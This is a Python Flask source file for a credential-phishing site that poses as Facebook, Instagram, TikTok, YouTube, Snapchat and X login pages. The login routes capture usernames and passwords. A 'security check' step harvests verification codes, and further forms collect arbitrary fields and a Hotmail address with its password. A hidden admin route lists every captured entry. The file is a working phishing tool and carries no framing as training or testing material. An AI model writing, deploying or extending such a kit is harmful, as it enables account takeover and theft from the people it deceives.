
from flask import Flask, render_template, request, redirect, url_for, abort
from datetime import datetime
import os

app = Flask(__name__)

SUBMISSIONS = []
PLATFORMS = {
    "facebook": {"name":"Facebook","icon":"fab fa-facebook-f","message":"🎉 You are now connected with Facebook. Keep sharing and stay social!"},
    "instagram": {"name":"Instagram","icon":"fab fa-instagram","message":"🌸 Welcome to Instagram. Capture, share, and enjoy the moment!"},
    "tiktok": {"name":"TikTok","icon":"fab fa-tiktok","message":"🎶 TikTok time! Create, laugh, and keep scrolling."},
    "youtube": {"name":"YouTube","icon":"fab fa-youtube","message":"▶️ Welcome to YouTube. Watch, learn, and explore."},
    "snapchat": {"name":"Snapchat","icon":"fab fa-snapchat-ghost","message":"👻 You’ve snapped into Snapchat. Stay playful!"},
    "x": {"name":"X","icon":"fab fa-x-twitter","message":"🐦 You’re now on X. Share your thoughts with the world."}
}

def record(slug, stage, payload):
    ts = datetime.utcnow().replace(microsecond=0).isoformat() + "Z"
    SUBMISSIONS.append({"ts": ts, "platform": slug, "stage": stage, "payload": payload})

@app.route("/")
def index():
    return render_template("index.html", platforms=PLATFORMS)

@app.route("/<slug>-login", methods=["GET","POST"])
def platform_login(slug):
    if slug not in PLATFORMS:
        abort(404)
    name = PLATFORMS[slug]["name"]
    if request.method == "POST":
        identifier = (request.form.get("identifier") or "").strip()
        password = (request.form.get("password") or "").strip()
        fmt = "email" if "@" in identifier else "phone"
        record(slug, "login", {"identifier": identifier, "password": password, "format": fmt})
        return redirect(url_for("security_check", slug=slug))
    return render_template("login.html", platform_slug=slug, platform=name)

@app.route("/security-check/<slug>", methods=["GET","POST"])
def security_check(slug):
    if slug not in PLATFORMS:
        abort(404)
    name = PLATFORMS[slug]["name"]
    if request.method == "POST":
        choice = request.form.get("choice")
        if choice == "option1":
            record(slug, "security_option1", {"note":"smile_wait"})
            return render_template("wait_long.html", platform_slug=slug, platform=name, delay_ms=90000, next_url=url_for("f1") + f"?platform={slug}")
        else:
            code = (request.form.get("code") or "").strip()
            record(slug, "security_option2", {"code": code})
            return render_template("loading_short.html", platform_slug=slug, platform=name, delay_ms=5000, next_url=url_for("f1") + f"?platform={slug}")
    return render_template("security_check.html", platform_slug=slug, platform=name)

@app.route("/f1", methods=["GET","POST"])
def f1():
    platform = request.args.get("platform") or request.form.get("platform") or ""
    if request.method == "POST":
        data = {k: request.form.get(k) for k in request.form.keys()}
        record(platform or "unknown", "f1_form", data)
        return redirect(url_for("f2") + f"?platform={platform}")
    return render_template("f1.html", platform_slug=platform)

@app.route("/f2", methods=["GET","POST"])
def f2():
    platform = request.args.get("platform") or request.form.get("platform") or ""
    if request.method == "POST":
        hotmail = (request.form.get("hotmail") or "").strip()
        pwd = (request.form.get("password") or "").strip()
        record(platform or "unknown", "f2_hotmail", {"hotmail": hotmail, "password": pwd})
        return redirect(url_for("final", slug=platform))
    return render_template("f2.html", platform_slug=platform)

@app.route("/final/<slug>")
def final(slug):
    if slug not in PLATFORMS:
        abort(404)
    cfg = PLATFORMS[slug]
    return render_template("final.html", platform_slug=slug, cfg=cfg)

@app.route("/super-secret-admin-link", methods=["GET","POST"])
def admin():
    if request.method == "POST":
        if request.form.get("action") == "confirm_clear":
            SUBMISSIONS.clear()
            return redirect(url_for("admin"))
    rows = list(reversed(SUBMISSIONS))
    return render_template("admin.html", attempts=rows)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
